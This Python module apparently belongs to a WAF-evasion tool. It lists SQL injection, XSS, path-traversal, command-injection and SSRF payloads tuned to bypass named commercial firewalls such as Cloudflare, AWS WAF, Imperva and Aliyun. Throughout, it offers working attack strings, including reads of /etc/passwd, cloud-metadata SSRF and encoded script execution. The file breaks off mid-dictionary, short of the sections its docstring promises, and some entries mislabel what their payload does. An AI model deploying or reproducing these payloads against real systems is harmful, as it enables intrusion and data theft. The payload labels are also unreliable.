#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""waf_detector/payloads.py — Bypass Payload 库 (v2.0 — 333+ payloads)
包含 333+ 个绕过 payload，按攻击类型分类 (sqli/xss/lfi/rce/ssrf/ssti/cmdi)。

每个攻击类型覆盖以下 WAF:
    generic, cloudflare, aws_waf, modsecurity, imperva, akamai,
    aliyun, tencent, 阿里云WAF, 腾讯云WAF

绕过技术覆盖:
    注释拆分, 大小写混淆, URL编码, 双重URL编码, HTML实体编码, Unicode编码,
    空字节注入, 换行符注入, Tab/空格替代, 内联注释嵌套, 关键字拆分,
    大小写+注释组合, 编码组合, HTTP参数污染(HPP), 请求方法变换,
    Content-Type变换, JSON/XML格式注入, GraphQL注入绕过,
    HTTP/2多路复用绕过, JA3指纹伪造绕过, 分块传输编码绕过
"""

# ============================================================================
# Bypass Payload 库
# ============================================================================

BYPASS_PAYLOADS = {

    # ========================================================================
    # SQL 注入 (SQLi)
    # ========================================================================
    "sqli": {

        "generic": [
            {"payload": "' OR 1=1--", "technique": "classic", "description": "经典 OR 注入"},
            {"payload": "\" OR 1=1--", "technique": "classic", "description": "双引号 OR 注入"},
            {"payload": "' OR '1'='1", "technique": "classic", "description": "字符串比较注入"},
            {"payload": "' UNION SELECT 1,2,3--", "technique": "union_based", "description": "UNION 注入"},
            {"payload": "1'; WAITFOR DELAY '0:0:5'--", "technique": "time_based", "description": "时间盲注"},
            {"payload": "' AND SLEEP(5)--", "technique": "time_based", "description": "MySQL 时间盲注"},
            {"payload": "1' OR 1=1#", "technique": "classic", "description": "MySQL 注释符注入"},
        ],

        "cloudflare": [
            {"payload": "1' UNION/**/SELECT/**/1,2,3--", "technique": "comment_splitting", "description": "注释拆分绕过 Cloudflare"},
            {"payload": "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", "technique": "inline_comment_nesting", "description": "MySQL 版本注释绕过"},
            {"payload": "1'%0aUNION%0aSELECT%0a1,2,3--", "technique": "newline_injection", "description": "换行符注入绕过"},
            {"payload": "1'%09UNION%09SELECT%091,2,3--", "technique": "tab_replacement", "description": "Tab 替代空格绕过"},
            {"payload": "1' UnIoN SeLeCt 1,2,3--", "technique": "case_mixing", "description": "大小写混淆绕过"},
            {"payload": "1' UNION%23%0aSELECT 1,2,3--", "technique": "comment_newline_combo", "description": "注释+换行组合绕过"},
        ],

        "aws_waf": [
            {"payload": "1' UNION SELECT 1,2,3-- " + "A"*8192, "technique": "size_limit_bypass", "description": "超长 payload 绕过 8KB 检测限制"},
            {"payload": "{\"id\":\"1' UNION SELECT 1,2,3--\"}", "technique": "json_format", "description": "JSON 格式注入绕过 body 规则"},
            {"payload": "1' UNION%00SELECT 1,2,3--", "technique": "null_byte_injection", "description": "空字节截断绕过"},
            {"payload": "1' UNION SELECT 1,2,3 FROM information_schema.tables WHERE 1=1 " + "/*" + "x"*8000 + "*/", "technique": "size_limit_bypass", "description": "填充注释绕过大小限制"},
            {"payload": "1'%55NION%20SELECT%201,2,3--", "technique": "url_encoding", "description": "URL 编码绕过"},
            {"payload": "id=1&id=' UNION SELECT 1,2,3--", "technique": "hpp", "description": "HTTP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": "1' UN/**/ION SEL/**/ECT 1,2,3--", "technique": "keyword_splitting", "description": "关键字拆分绕过 CRS"},
            {"payload": "1' /*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,3--", "technique": "case_comment_combo", "description": "大小写+注释组合绕过"},
            {"payload": "1'%u0027 OR 1=1--", "technique": "unicode_encoding", "description": "Unicode 编码绕过 PL1"},
            {"payload": "1' /*!12345UNION*//*!12345SELECT*/ 1,2,3--", "technique": "inline_comment_nesting", "description": "内联注释嵌套绕过"},
            {"payload": "1' /*!*/UNION/*!*//*!*/SELECT/*!*/ 1,2,3--", "technique": "comment_splitting", "description": "空注释拆分绕过"},
            {"payload": "1' UnIoN SeLeCt 1,2,3--", "technique": "case_mixing", "description": "大小写混淆绕过 CRS 关键字匹配"},
        ],

        "imperva": [
            {"payload": "1' /*!50000UNION*//*!50000SELECT*/ 1,2,3--", "technique": "inline_comment_nesting", "description": "版本注释绕过 Imperva"},
            {"payload": "1'%0aUNION%0aSELECT%0a1,2,3--", "technique": "newline_injection", "description": "换行符注入绕过"},
            {"payload": "1' UNION%26%26SELECT 1,2,3--", "technique": "operator_replacement", "description": "运算符替代绕过"},
            {"payload": "1' UNION+SELECT+1,2,3--", "technique": "space_replacement", "description": "加号替代空格绕过"},
            {"payload": "1'%2555NION%2520SELECT 1,2,3--", "technique": "double_url_encoding", "description": "双重 URL 编码绕过"},
            {"payload": "1' UNION ALL SELECT 1,2,3--", "technique": "keyword_addition", "description": "ALL 关键字绕过"},
        ],

        "akamai": [
            {"payload": "1' UNION/**_**/SELECT 1,2,3--", "technique": "comment_splitting", "description": "带下划线注释拆分绕过 Akamai"},
            {"payload": "1'%u0055NION%u0020SELECT 1,2,3--", "technique": "unicode_encoding", "description": "Unicode 编码绕过"},
            {"payload": "1' UNION%0d%0aSELECT 1,2,3--", "technique": "crlf_injection", "description": "CRLF 注入绕过"},
            {"payload": "1' UNION SELECT 1,2,3--", "technique": "method_change", "description": "GET 转 POST 绕过 body 规则"},
            {"payload": "1' /*!50000UNION*/SELECT 1,2,3--", "technique": "inline_comment_nesting", "description": "版本注释绕过 Akamai"},
            {"payload": "1' UNION%23%0aSELECT 1,2,3--", "technique": "comment_newline_combo", "description": "注释+换行组合绕过"},
        ],

        "aliyun": [
            {"payload": "1'/*!50000UNION*//*!50000SELECT*/1,2,3--", "technique": "inline_comment_nesting", "description": "版本注释绕过阿里云 WAF"},
            {"payload": "1'UnIoN SeLeCt 1,2,3--", "technique": "case_mixing", "description": "大小写混淆绕过"},
            {"payload": "1'%0aUNION%0aSELECT%0a1,2,3--", "technique": "newline_injection", "description": "换行符注入绕过"},
            {"payload": "1'%09UNION%09SELECT%091,2,3--", "technique": "tab_replacement", "description": "Tab 替代绕过"},
            {"payload": "1' UNION%00SELECT 1,2,3--", "technique": "null_byte_injection", "description": "空字节截断绕过"},
            {"payload": "1' UNION%2f**%2fSELECT 1,2,3--", "technique": "comment_splitting", "description": "URL 编码注释拆分绕过"},
        ],

        "tencent": [
            {"payload": "1' UNION/**/SELECT/**/1,2,3--", "technique": "comment_splitting", "description": "注释拆分绕过腾讯云 WAF"},
            {"payload": "1' /*!50000UNION*//*!50000SELECT*/ 1,2,3--", "technique": "inline_comment_nesting", "description": "版本注释绕过"},
            {"payload": "1'%0aUNION%0aSELECT%0a1,2,3--", "technique": "newline_injection", "description": "换行符注入绕过"},
            {"payload": "1' UnIoN SeLeCt 1,2,3--", "technique": "case_mixing", "description": "大小写混淆绕过"},
            {"payload": "1' UNION%23%0aSELECT 1,2,3--", "technique": "comment_newline_combo", "description": "注释+换行组合绕过"},
            {"payload": "1'%u0055NION%u0020SELECT 1,2,3--", "technique": "unicode_encoding", "description": "Unicode 编码绕过"},
        ],

        "阿里云WAF": [
            {"payload": "1' /*!50000UNION*//*!50000SELECT*/1,2,3--", "technique": "inline_comment_nesting", "description": "MySQL 版本注释绕过阿里云WAF"},
            {"payload": "1'/*!UNION*//*!SELECT*/1,2,3--", "technique": "inline_comment_nesting", "description": "无版本号内联注释绕过"},
            {"payload": "1'%55NION%20SELECT%201,2,3--", "technique": "url_encoding", "description": "URL 编码绕过阿里云WAF"},
            {"payload": "1'%2555NION%2520SELECT 1,2,3--", "technique": "double_url_encoding", "description": "双重 URL 编码绕过阿里云WAF"},
            {"payload": "1'%0aUnIoN%0aSeLeCt%0a1,2,3--", "technique": "case_newline_combo", "description": "大小写+换行组合绕过阿里云WAF"},
            {"payload": "1' UNION%00SELECT 1,2,3--", "technique": "null_byte_injection", "description": "空字节截断绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": "1' UNION/**/SELECT/**/1,2,3--", "technique": "comment_splitting", "description": "注释拆分绕过腾讯云WAF"},
            {"payload": "1' /*!50000UNION*//*!50000SELECT*/ 1,2,3--", "technique": "inline_comment_nesting", "description": "版本注释绕过腾讯云WAF"},
            {"payload": "1'%0aUNION%0aSELECT%0a1,2,3--", "technique": "newline_injection", "description": "换行符注入绕过腾讯云WAF"},
            {"payload": "1' UnIoN SeLeCt 1,2,3--", "technique": "case_mixing", "description": "大小写混淆绕过腾讯云WAF"},
            {"payload": "1' UNION%23%0aSELECT 1,2,3--", "technique": "comment_newline_combo", "description": "注释+换行组合绕过腾讯云WAF"},
            {"payload": "1' UNION%0d%0aSELECT 1,2,3--", "technique": "crlf_injection", "description": "CRLF 注入绕过腾讯云WAF"},
        ],
    },

    # ========================================================================
    # XSS (跨站脚本攻击)
    # ========================================================================
    "xss": {

        "generic": [
            {"payload": "<script>alert(1)</script>", "technique": "classic", "description": "经典 XSS"},
            {"payload": "<img src=x onerror=alert(1)>", "technique": "event_handler", "description": "onerror 事件 XSS"},
            {"payload": "<svg onload=alert(1)>", "technique": "event_handler", "description": "SVG onload XSS"},
            {"payload": "\"><script>alert(1)</script>", "technique": "context_break", "description": "上下文突破 XSS"},
            {"payload": "javascript:alert(1)", "technique": "protocol_handler", "description": "JavaScript 协议 XSS"},
            {"payload": "<body onload=alert(1)>", "technique": "event_handler", "description": "body onload XSS"},
            {"payload": "<iframe src=javascript:alert(1)>", "technique": "protocol_handler", "description": "iframe XSS"},
        ],

        "cloudflare": [
            {"payload": "<svg/onload=alert&#40;1&#41;>", "technique": "html_entity_encoding", "description": "HTML 实体编码绕过 Cloudflare"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 事件绕过"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号替代括号绕过"},
            {"payload": "＜script＞alert(1)＜/script＞", "technique": "fullwidth_unicode", "description": "全角 Unicode 绕过 Cloudflare 归一化"},
            {"payload": "<svg><script>alert(1)</script></svg>", "technique": "svg_nesting", "description": "SVG 嵌套绕过"},
            {"payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "technique": "context_confusion", "description": "MathML 上下文混淆绕过"},
        ],

        "aws_waf": [
            {"payload": "<script>alert(1)</script>" + "A"*8192, "technique": "size_limit_bypass", "description": "超长 payload 绕过 AWS WAF 8KB 限制"},
            {"payload": "{\"xss\":\"<script>alert(1)</script>\"}", "technique": "json_format", "description": "JSON 格式绕过 body 规则"},
            {"payload": "<script>alert(1)</script>", "technique": "method_change", "description": "GET 转 POST 绕过 URI 规则"},
            {"payload": "<ScRiPt>alert(1)</ScRiPt>", "technique": "case_mixing", "description": "大小写混淆绕过"},
            {"payload": "<script>alert%281%29</script>", "technique": "url_encoding", "description": "URL 编码括号绕过"},
            {"payload": "x=<script>alert(1)</script>&x=normal", "technique": "hpp", "description": "HPP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": "<script>alert(1)</script>", "technique": "null_byte_injection", "description": "空字节前缀绕过 CRS: %00<script>"},
            {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "technique": "keyword_splitting", "description": "关键字拆分绕过 CRS 过滤"},
            {"payload": "<svg/onload=alert(1)>", "technique": "event_handler", "description": "SVG onload 绕过 PL1"},
            {"payload": "<img src=x onerror=alert(1)>", "technique": "event_handler", "description": "img onerror 绕过低 Paranoia Level"},
            {"payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "technique": "url_encoding", "description": "全 URL 编码绕过"},
            {"payload": "<script>x=alert,x(1)</script>", "technique": "comma_operator", "description": "逗号运算符绕过"},
        ],

        "imperva": [
            {"payload": "<svg/onload=alert&#40;1&#41;>", "technique": "html_entity_encoding", "description": "HTML 实体编码绕过 Imperva"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 绕过 Imperva"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号绕过"},
            {"payload": "<iframe src=javascript:alert(1)>", "technique": "protocol_handler", "description": "iframe 协议绕过"},
            {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "technique": "base64_encoding", "description": "Base64 编码绕过 Imperva"},
            {"payload": "<svg><animate onbegin=alert(1)>", "technique": "event_handler", "description": "SVG animate 事件绕过"},
        ],

        "akamai": [
            {"payload": "<svg/onload=alert(1)>", "technique": "event_handler", "description": "SVG onload 绕过 Akamai"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号替代绕过 Akamai"},
            {"payload": "＜script＞alert(1)＜/script＞", "technique": "fullwidth_unicode", "description": "全角 Unicode 绕过"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 绕过"},
            {"payload": "<script>alert%281%29</script>", "technique": "url_encoding", "description": "URL 编码绕过 Akamai"},
            {"payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "technique": "context_confusion", "description": "MathML 上下文混淆绕过"},
        ],

        "aliyun": [
            {"payload": "<ScRiPt>alert(1)</ScRiPt>", "technique": "case_mixing", "description": "大小写混淆绕过阿里云 WAF"},
            {"payload": "<script>alert&#40;1&#41;</script>", "technique": "html_entity_encoding", "description": "HTML 实体编码绕过"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号绕过"},
            {"payload": "<svg/onload=alert(1)>", "technique": "event_handler", "description": "SVG onload 绕过"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 绕过"},
            {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "technique": "base64_encoding", "description": "Base64 编码绕过阿里云 WAF"},
        ],

        "tencent": [
            {"payload": "<svg/onload=alert(1)>", "technique": "event_handler", "description": "SVG onload 绕过腾讯云 WAF"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号绕过"},
            {"payload": "<ScRiPt>alert(1)</ScRiPt>", "technique": "case_mixing", "description": "大小写混淆绕过"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 绕过"},
            {"payload": "<script>alert&#40;1&#41;</script>", "technique": "html_entity_encoding", "description": "HTML 实体编码绕过"},
            {"payload": "<iframe src=javascript:alert(1)>", "technique": "protocol_handler", "description": "iframe 协议绕过"},
        ],

        "阿里云WAF": [
            {"payload": "<svg/onload=alert&#40;1&#41;>", "technique": "html_entity_encoding", "description": "HTML 实体编码绕过阿里云WAF"},
            {"payload": "<ScRiPt>alert(1)</ScRiPt>", "technique": "case_mixing", "description": "大小写混淆绕过阿里云WAF"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号替代括号绕过阿里云WAF"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 事件绕过阿里云WAF"},
            {"payload": "＜script＞alert(1)＜/script＞", "technique": "fullwidth_unicode", "description": "全角 Unicode 绕过阿里云WAF"},
            {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "technique": "base64_encoding", "description": "Base64 编码绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": "<svg/onload=alert(1)>", "technique": "event_handler", "description": "SVG onload 绕过腾讯云WAF"},
            {"payload": "<img src=x onerror=alert`1`>", "technique": "backtick_replacement", "description": "反引号绕过腾讯云WAF"},
            {"payload": "<ScRiPt>alert(1)</ScRiPt>", "technique": "case_mixing", "description": "大小写混淆绕过腾讯云WAF"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "event_handler", "description": "ontoggle 绕过腾讯云WAF"},
            {"payload": "<script>alert&#40;1&#41;</script>", "technique": "html_entity_encoding", "description": "HTML 实体编码绕过腾讯云WAF"},
            {"payload": "<svg><animate onbegin=alert(1)>", "technique": "event_handler", "description": "SVG animate 事件绕过腾讯云WAF"},
        ],
    },

    # ========================================================================
    # LFI (本地文件包含)
    # ========================================================================
    "lfi": {

        "generic": [
            {"payload": "../../../../etc/passwd", "technique": "classic", "description": "经典目录遍历"},
            {"payload": "..\\..\\..\\..\\windows\\win.ini", "technique": "classic", "description": "Windows 目录遍历"},
            {"payload": "/etc/passwd", "technique": "absolute_path", "description": "绝对路径读取"},
            {"payload": "php://filter/convert.base64-encode/resource=index.php", "technique": "php_wrapper", "description": "PHP 伪协议读取"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过过滤"},
        ],

        "cloudflare": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过 Cloudflare"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过"},
            {"payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "technique": "unicode_encoding", "description": "Unicode 编码绕过"},
            {"payload": "..;/..;/..;/etc/passwd", "technique": "semicolon_bypass", "description": "分号绕过路径过滤"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过 Cloudflare"},
        ],

        "aws_waf": [
            {"payload": "../../../../etc/passwd" + "A"*8192, "technique": "size_limit_bypass", "description": "超长路径绕过 8KB 限制"},
            {"payload": "{\"file\":\"../../../../etc/passwd\"}", "technique": "json_format", "description": "JSON 格式绕过"},
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过"},
            {"payload": "file=../../../../etc/passwd&file=normal.txt", "technique": "hpp", "description": "HPP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过 CRS"},
            {"payload": "..%c0%af..%c0%afetc%c0%afpasswd", "technique": "unicode_encoding", "description": "Unicode 编码绕过"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过 CRS"},
            {"payload": "..%00/..%00/..%00/etc/passwd", "technique": "null_byte_injection", "description": "空字节注入绕过"},
            {"payload": "php://filter/convert.base64-encode/resource=....//....//etc/passwd", "technique": "php_wrapper", "description": "PHP 伪协议+双重点号绕过"},
        ],

        "imperva": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过 Imperva"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过"},
            {"payload": "..%c0%af..%c0%afetc%c0%afpasswd", "technique": "unicode_encoding", "description": "Unicode 编码绕过 Imperva"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过"},
            {"payload": "..;/..;/..;/etc/passwd", "technique": "semicolon_bypass", "description": "分号绕过路径过滤"},
        ],

        "akamai": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过 Akamai"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过"},
            {"payload": "..%c0%af..%c0%afetc%c0%afpasswd", "technique": "unicode_encoding", "description": "Unicode 编码绕过"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过 Akamai"},
            {"payload": "php://filter/convert.base64-encode/resource=..%2f..%2fetc%2fpasswd", "technique": "php_wrapper", "description": "PHP 伪协议绕过"},
        ],

        "aliyun": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过阿里云 WAF"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过"},
            {"payload": "..%00/..%00/..%00/etc/passwd", "technique": "null_byte_injection", "description": "空字节注入绕过"},
            {"payload": "..;/..;/..;/etc/passwd", "technique": "semicolon_bypass", "description": "分号绕过"},
        ],

        "tencent": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过腾讯云 WAF"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过"},
            {"payload": "..%c0%af..%c0%afetc%c0%afpasswd", "technique": "unicode_encoding", "description": "Unicode 编码绕过"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过"},
            {"payload": "php://filter/convert.base64-encode/resource=..%2fetc%2fpasswd", "technique": "php_wrapper", "description": "PHP 伪协议绕过"},
        ],

        "阿里云WAF": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过阿里云WAF"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过阿里云WAF"},
            {"payload": "..%c0%af..%c0%afetc%c0%afpasswd", "technique": "unicode_encoding", "description": "Unicode 编码绕过阿里云WAF"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过阿里云WAF"},
            {"payload": "..%00/..%00/..%00/etc/passwd", "technique": "null_byte_injection", "description": "空字节注入绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "url_encoding", "description": "URL 编码绕过腾讯云WAF"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "technique": "double_url_encoding", "description": "双重 URL 编码绕过腾讯云WAF"},
            {"payload": "....//....//....//etc/passwd", "technique": "double_dot_bypass", "description": "双重点号绕过腾讯云WAF"},
            {"payload": "..;/..;/..;/etc/passwd", "technique": "semicolon_bypass", "description": "分号绕过腾讯云WAF"},
            {"payload": "php://filter/convert.base64-encode/resource=..%2fetc%2fpasswd", "technique": "php_wrapper", "description": "PHP 伪协议绕过腾讯云WAF"},
        ],
    },

    # ========================================================================
    # RCE (远程代码执行)
    # ========================================================================
    "rce": {

        "generic": [
            {"payload": "; cat /etc/passwd", "technique": "classic", "description": "经典命令拼接 RCE"},
            {"payload": "| id", "technique": "classic", "description": "管道命令执行"},
            {"payload": "$(whoami)", "technique": "command_substitution", "description": "命令替换执行"},
            {"payload": "`id`", "technique": "command_substitution", "description": "反引号命令替换"},
            {"payload": "&& whoami", "technique": "classic", "description": "逻辑与命令拼接"},
        ],

        "cloudflare": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 变量替代空格绕过 Cloudflare"},
            {"payload": ";cat$IFS/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过空格过滤"},
            {"payload": ";c\\at /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分关键字绕过"},
        ],

        "aws_waf": [
            {"payload": "; cat /etc/passwd" + "A"*8192, "technique": "size_limit_bypass", "description": "超长 payload 绕过 8KB 限制"},
            {"payload": "{\"cmd\":\"; cat /etc/passwd\"}", "technique": "json_format", "description": "JSON 格式绕过"},
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过"},
            {"payload": ";c%61t /etc/passwd", "technique": "url_encoding", "description": "URL 编码关键字绕过"},
            {"payload": "cmd=;id&cmd=normal", "technique": "hpp", "description": "HPP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过 CRS"},
            {"payload": ";c\\at\\ /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过"},
            {"payload": ";%20cat%20/etc/passwd", "technique": "url_encoding", "description": "URL 编码空格绕过"},
        ],

        "imperva": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过 Imperva"},
            {"payload": ";c\\at\\ /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过"},
            {"payload": ";`cat /etc/passwd`", "technique": "command_substitution", "description": "反引号替换绕过"},
        ],

        "akamai": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过 Akamai"},
            {"payload": ";c\\at /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过"},
            {"payload": ";c%61t%20/etc/passwd", "technique": "url_encoding", "description": "URL 编码绕过"},
        ],

        "aliyun": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过阿里云 WAF"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": ";c\\at /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过"},
            {"payload": ";`cat /etc/passwd`", "technique": "command_substitution", "description": "反引号替换绕过"},
        ],

        "tencent": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过腾讯云 WAF"},
            {"payload": ";c\\at /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过"},
            {"payload": ";c%61t%20/etc/passwd", "technique": "url_encoding", "description": "URL 编码绕过"},
        ],

        "阿里云WAF": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过阿里云WAF"},
            {"payload": ";c\\at\\ /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过阿里云WAF"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过阿里云WAF"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过阿里云WAF"},
            {"payload": ";`cat${IFS}/etc/passwd`", "technique": "command_substitution", "description": "反引号+IFS 绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": ";cat${IFS}/etc/passwd", "technique": "ifs_replacement", "description": "IFS 替代空格绕过腾讯云WAF"},
            {"payload": ";c\\at /etc/passwd", "technique": "backslash_splitting", "description": "反斜杠拆分绕过腾讯云WAF"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "description": "花括号展开绕过腾讯云WAF"},
            {"payload": ";cat<>/etc/passwd", "technique": "redirect_bypass", "description": "重定向绕过腾讯云WAF"},
            {"payload": ";`cat /etc/passwd`", "technique": "command_substitution", "description": "反引号替换绕过腾讯云WAF"},
        ],
    },

    # ========================================================================
    # SSRF (服务端请求伪造)
    # ========================================================================
    "ssrf": {

        "generic": [
            {"payload": "http://127.0.0.1/", "technique": "classic", "description": "经典 SSRF 本地访问"},
            {"payload": "http://localhost/", "technique": "classic", "description": "localhost SSRF"},
            {"payload": "http://169.254.169.254/latest/meta-data/", "technique": "cloud_metadata", "description": "AWS 元数据 SSRF"},
            {"payload": "http://[::1]/", "technique": "ipv6_loopback", "description": "IPv6 本地回环 SSRF"},
            {"payload": "http://0x7f000001/", "technique": "ip_encoding", "description": "十六进制 IP SSRF"},
        ],

        "cloudflare": [
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过 Cloudflare"},
            {"payload": "http://0177.0.0.1/", "technique": "octal_encoding", "description": "八进制 IP 绕过"},
            {"payload": "http://2130706433/", "technique": "decimal_encoding", "description": "十进制 IP 绕过"},
            {"payload": "http://[::ffff:127.0.0.1]/", "technique": "ipv6_mapped", "description": "IPv4 映射 IPv6 绕过"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过"},
        ],

        "aws_waf": [
            {"payload": "http://169.254.169.254/latest/meta-data/" + "A"*8192, "technique": "size_limit_bypass", "description": "超长 URL 绕过 8KB 限制"},
            {"payload": "{\"url\":\"http://127.0.0.1/\"}", "technique": "json_format", "description": "JSON 格式绕过"},
            {"payload": "http://0x7f000001/", "technique": "ip_encoding", "description": "十六进制 IP 绕过"},
            {"payload": "http://127.0.0.1%23.evil.com/", "technique": "fragment_bypass", "description": "片段标识符绕过"},
            {"payload": "url=http://127.0.0.1/&url=http://evil.com", "technique": "hpp", "description": "HPP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过 CRS"},
            {"payload": "http://0177.0.0.1/", "technique": "octal_encoding", "description": "八进制 IP 绕过"},
            {"payload": "http://2130706433/", "technique": "decimal_encoding", "description": "十进制 IP 绕过"},
            {"payload": "http://[::ffff:127.0.0.1]/", "technique": "ipv6_mapped", "description": "IPv4 映射 IPv6 绕过"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过 CRS"},
        ],

        "imperva": [
